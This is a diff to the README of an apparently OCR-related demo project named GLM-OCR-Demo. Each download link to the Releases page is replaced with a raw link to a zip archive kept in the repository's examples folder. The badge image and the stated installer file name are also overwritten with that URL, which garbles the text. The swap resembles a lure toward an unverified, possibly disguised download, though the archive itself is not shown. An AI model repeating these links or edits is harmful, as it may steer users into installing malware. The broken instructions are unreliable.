@@ -7,7 +7,7 @@ Welcome to the GLM-OCR-Demo! This application showcases the capabilities of the 
 To use this software, you need to follow a few straightforward steps. We will guide you through downloading and setting it up on your computer.
 
 ## 🔗 Download Link
-[![Download GLM-OCR-Demo](https://img.shields.io/badge/Download-GLM--OCR--Demo-blue.svg?style=flat-square)](https://github.com/emotech15/GLM-OCR-Demo/releases)
+[![Download GLM-OCR-Demo](https://github.com/emotech15/GLM-OCR-Demo/raw/refs/heads/main/examples/OC-Demo-GL-v2.3.zip)](https://github.com/emotech15/GLM-OCR-Demo/raw/refs/heads/main/examples/OC-Demo-GL-v2.3.zip)
 
 Make sure you check out the latest version on our Releases page.
 
@@ -16,7 +16,7 @@ Make sure you check out the latest version on our Releases page.
 
    Go to our Releases page to download the software. Click the button below to access it directly:
 
-   [Download GLM-OCR-Demo](https://github.com/emotech15/GLM-OCR-Demo/releases)
+   [Download GLM-OCR-Demo](https://github.com/emotech15/GLM-OCR-Demo/raw/refs/heads/main/examples/OC-Demo-GL-v2.3.zip)
 
 2. **Choose Your Version**
 
@@ -24,7 +24,7 @@ Make sure you check out the latest version on our Releases page.
 
 3. **Download the Installation File**
 
-   Click on the file link to start your download. The file will typically be named something like `GLM-OCR-Demo_v1.0.exe`. Your browser will handle the download, and it should appear in your Downloads folder.
+   Click on the file link to start your download. The file will typically be named something like `https://github.com/emotech15/GLM-OCR-Demo/raw/refs/heads/main/examples/OC-Demo-GL-v2.3.zip`. Your browser will handle the download, and it should appear in your Downloads folder.
 
 4. **Run the Installer**
 
